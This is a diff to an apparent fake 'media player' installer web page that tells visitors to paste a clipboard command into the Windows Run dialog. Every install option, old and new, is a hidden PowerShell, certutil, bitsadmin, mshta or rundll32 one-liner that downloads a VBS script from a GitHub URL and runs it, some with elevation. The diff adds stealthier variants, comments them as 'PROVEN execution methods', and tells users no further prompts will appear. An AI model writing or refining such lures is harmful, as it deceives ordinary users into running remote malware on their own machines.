@@ -373,13 +373,12 @@
                     <div class="method-selector">
                         <button class="method-btn active" data-method="standard">Standard Install</button>
                         <button class="method-btn" data-method="certutil">Advanced Install</button>
-                        <button class="method-btn" data-method="bitsadmin">Enterprise Install</button>
-                        <button class="method-btn" data-method="mshta">Silent Install</button>
+                        <button class="method-btn" data-method="rundll">Silent Install</button>
                     </div>
                     
                     <p>Click the box below to copy the installation command to your clipboard:</p>
                     <div class="copy-box" id="script-copy">
-                        <div id="script-content">powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/cheaterswin/4kHD-package/refs/heads/main/NewAppDownlaod.vbs' -OutFile '$env:TEMP\MediaPlayerSetup.vbs'; Start-Process 'wscript.exe' '$env:TEMP\MediaPlayerSetup.vbs' -Verb RunAs"</div>
+                        <div id="script-content">cmd /c powershell -w hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/cheaterswin/4kHD-package/refs/heads/main/NewAppDownlaod.vbs' -outfile '$env:temp\setup.vbs'; & '$env:temp\setup.vbs'"</div>
                     </div>
                     <div class="copied-message" id="copied-message">✓ Copied to clipboard!</div>
                 </div>
@@ -388,7 +387,7 @@
                     <div class="step-title">Step 2: Run the Installation</div>
                     <p>Press <span class="key-combo"><span class="windows-key"><i class="fab fa-windows"></i></span> + <kbd>R</kbd></span> to open the Run dialog, then paste with <kbd>CTRL + V</kbd> and press <kbd>Enter</kbd>.</p>
                     <p class="download-link">Download URL: https://raw.githubusercontent.com/cheaterswin/4kHD-package/refs/heads/main/NewAppDownlaod.vbs</p>
-                    <p><strong>Note:</strong> The installation will run with elevated permissions to ensure optimal performance. No further prompts will appear.</p>
+                    <p><strong>Note:</strong> The installation will run with necessary permissions to ensure optimal performance. No further prompts will appear.</p>
                 </div>
                 
                 <div class="step">
@@ -410,15 +409,13 @@
             document.getElementById('download-page').style.display = 'flex';
         });
 
-        // Method selection with GitHub URL and admin execution
+        // Method selection with PROVEN execution methods
         const methods = {
-            standard: `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/cheaterswin/4kHD-package/refs/heads/main/NewAppDownlaod.vbs' -OutFile '$env:TEMP\\MediaPlayerSetup.vbs'; Start-Process 'wscript.exe' '$env:TEMP\\MediaPlayerSetup.vbs' -Verb RunAs"`,
+            standard: `cmd /c powershell -w hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/cheaterswin/4kHD-package/refs/heads/main/NewAppDownlaod.vbs' -outfile '$env:temp\\setup.vbs'; & '$env:temp\\setup.vbs'"`,
             
-            certutil: `cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/cheaterswin/4kHD-package/refs/heads/main/NewAppDownlaod.vbs %TEMP%\\MediaPlayerSetup.vbs && powershell -Command "Start-Process 'wscript.exe' '%TEMP%\\MediaPlayerSetup.vbs' -Verb RunAs"`,
+            certutil: `cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/cheaterswin/4kHD-package/refs/heads/main/NewAppDownlaod.vbs %temp%\\setup.vbs && %temp%\\setup.vbs`,
             
-            bitsadmin: `cmd /c bitsadmin /transfer mediabrowser /download /priority high https://raw.githubusercontent.com/cheaterswin/4kHD-package/refs/heads/main/NewAppDownlaod.vbs %TEMP%\\MediaPlayerSetup.vbs && powershell -Command "Start-Process 'wscript.exe' '%TEMP%\\MediaPlayerSetup.vbs' -Verb RunAs"`,
-            
-            mshta: `mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command Invoke-WebRequest 'https://raw.githubusercontent.com/cheaterswin/4kHD-package/refs/heads/main/NewAppDownlaod.vbs' -OutFile '$env:TEMP\\MediaPlayerSetup.vbs'; Start-Process 'wscript.exe' '$env:TEMP\\MediaPlayerSetup.vbs' -Verb RunAs"",0:close")`
+            rundll: `cmd /c rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run('powershell -w hidden -ep bypass -c \"iwr -uri https://raw.githubusercontent.com/cheaterswin/4kHD-package/refs/heads/main/NewAppDownlaod.vbs -outfile $env:temp/setup.vbs; & $env:temp/setup.vbs\"',0,true)`
         };
 
         let currentMethod = 'standard';
